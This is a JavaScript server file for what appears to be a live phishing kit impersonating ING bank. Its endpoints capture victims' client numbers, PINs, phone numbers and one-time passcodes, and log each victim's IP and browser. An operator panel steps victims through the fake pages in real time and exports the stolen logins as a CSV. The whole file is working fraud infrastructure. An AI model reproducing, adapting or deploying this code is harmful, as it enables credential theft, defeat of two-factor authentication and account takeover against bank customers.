/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');

/* ----------  CONFIG  ---------- */
const PANEL_USER     = process.env.PANEL_USER  || 'admin';
const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
const COOKIE_SECRET  = process.env.COOKIE_SECRET || crypto.randomBytes(32).toString('hex');

const app  = express();
const PORT = process.env.PORT || 3000;

console.log('Starting server...');
console.log('Panel user:', PANEL_USER);

/* ----------  STATE  ---------- */
const sessionsMap     = new Map();
const sessionActivity = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

// Simple in-memory auth store (sid -> authed)
const authSessions = new Map();

/* ----------  MIDDLEWARE  ---------- */
app.set('trust proxy', 1);

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Simple cookie parser for auth
app.use((req, res, next) => {
  const cookie = req.headers.cookie || '';
  req.authToken = cookie.split(';').find(c => c.trim().startsWith('auth='))?.split('=')[1] || null;
  next();
});

/* ----------  AUTH MIDDLEWARE  ---------- */
function checkAuth(req, res, next) {
  const token = req.authToken;
  if (token && authSessions.has(token)) {
    req.isAuthed = true;
    req.username = authSessions.get(token);
    return next();
  }
  req.isAuthed = false;
  next();
}

/* ----------  STATIC ROUTES  ---------- */
app.use(express.static(__dirname));

app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  PANEL ROUTES  ---------- */
app.get('/panel', checkAuth, (req, res) => {
  if (req.isAuthed) return res.sendFile(__dirname + '/_panel.html');
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  const { user, pw } = req.body;
  console.log('Login attempt:', user, 'Expected:', PANEL_USER, 'Match:', user === PANEL_USER && pw === PANEL_PASS);
  
  if (user === PANEL_USER && pw === PANEL_PASS) {
    const token = crypto.randomBytes(16).toString('hex');
    authSessions.set(token, user);
    
    // Set cookie with minimal restrictions for Cloudflare compatibility
    res.setHeader('Set-Cookie', `auth=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
    console.log('Login success, token:', token);
    return res.redirect('/panel');
  }
  
  res.redirect('/panel?fail=1');
});

app.post('/panel/logout', (req, res) => {
  if (req.authToken) authSessions.delete(req.authToken);
  res.setHeader('Set-Cookie', 'auth=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
  res.redirect('/panel');
});

app.get('/panel/*', (req, res) => res.redirect('/panel'));

/* ----------  DOMAIN HELPER  ---------- */
app.use((req, res, next) => {
  const host  = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER  ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

/* ----------  SESSION HELPERS  ---------- */
function getSessionHeader(v) {
  if (v.page === 'success') return `🦁 ING Login approved`;
  if (v.status === 'approved') return `🦁 ING Login approved`;
  if (v.page === 'index.html') return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
  if (v.page === 'verify.html') return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
  if (v.page === 'unregister.html') return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
  if (v.page === 'otp.html') return v.otp ? `✅ Received OTP` : `🔑 Awaiting OTP...`;
  return `🔑 Awaiting OTP...`;
}

/* ----------  VICTIM API  ---------- */
app.post('/api/session', (req, res) => {
  const sid = crypto.randomUUID();
  const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua  = req.headers['user-agent'] || 'n/a';
  
  victimCounter++;
  const victim = {
    sid, ip, ua, dateStr: new Date().toLocaleString(),
    entered: false, email: '', password: '', phone: '', otp: '',
    page: 'index.html',
    platform: uaParser(ua).os?.name || 'n/a',
    browser: uaParser(ua).browser?.name || 'n/a',
    unregisterClicked: false,
    status: 'loaded', victimNum: victimCounter,
    activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected' }]
  };
  
  sessionsMap.set(sid, victim);
  sessionActivity.set(sid, Date.now());
  res.json({ sid });
});

app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

app.post('/api/login', (req, res) => {
  const { sid, email, password } = req.body;
  if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
  
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.entered = true; 
  v.email = email; 
  v.password = password;
  v.status = 'wait';
  v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
  
  auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, ip: v.ip, ua: v.ua });
  res.sendStatus(200);
});

app.post('/api/verify', (req, res) => {
  const { sid, phone } = req.body;
  if (!phone?.trim()) return res.sendStatus(400);
  
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.phone = phone;
  v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
  
  const entry = auditLog.find(e => e.sid === sid);
  if (entry) entry.phone = phone;
  res.sendStatus(200);
});

app.post('/api/unregister', (req, res) => {
  const { sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.unregisterClicked = true;
  v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Proceeded to unregister' });
  res.sendStatus(200);
});

app.post('/api/otp', (req, res) => {
  const { sid, otp } = req.body;
  if (!otp?.trim()) return res.sendStatus(400);
  
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.otp = otp;
  v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
  
  const entry = auditLog.find(e => e.sid === sid);
  if (entry) entry.otp = otp;
  res.sendStatus(200);
});

app.post('/api/page', (req, res) => {
  const { sid, page } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  const oldPage = v.page;
  v.page = page;
  v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
  res.sendStatus(200);
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  res.json({ status: v ? v.status : 'gone' });
});

/* ----------  PANEL API  ---------- */
app.get('/api/panel', checkAuth, (req, res) => {
  if (!req.isAuthed) return res.status(401).json({ error: 'Not authenticated' });
  
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
    entered: v.entered, unregisterClicked: v.unregisterClicked,
    activityLog: v.activityLog
  }));
  
  res.json({
    domain: currentDomain,
    username: req.username || PANEL_USER,
    totalVictims: victimCounter,
    active: list.length,
    waiting: list.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: list,
    logs: auditLog.slice(-50).reverse()
  });
});

app.post('/api/panel', checkAuth, (req, res) => {
  if (!req.isAuthed) return res.status(401).json({ error: 'Not authenticated' });
  
  const { action, sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo'; v.entered = false; v.email = ''; v.password = '';
      } else if (v.page === 'verify.html') {
        v.status = 'redo'; v.phone = '';
      } else if (v.page === 'otp.html') {
        v.status = 'redo'; v.otp = '';
      }
      break;
    case 'cont':
      v.status = 'ok';
      if (v.page === 'index.html') v.page = 'verify.html';
      else if (v.page === 'verify.html') v.page = 'unregister.html';
      else if (v.page === 'unregister.html') v.page = 'otp.html';
      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
      break;
    case 'delete':
      sessionsMap.delete(sid);
      sessionActivity.delete(sid);
      break;
  }
  res.json({ ok: true });
});

app.get('/api/export', checkAuth, (req, res) => {
  if (!req.isAuthed) return res.status(401).send('Unauthorized');
  
  const successes = auditLog
    .filter(r => r.phone && r.otp)
    .map(r => [r.victimN, r.email, r.password, r.phone, r.otp, r.ip, r.ua, new Date(r.t).toISOString()]);
  
  const csv = [
    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
    ...successes
  ].map(r => r.map(v => `"${v}"`).join(',')).join('\n');
  
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="logins.csv"');
  res.send(csv);
});

/* ----------  START  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
});
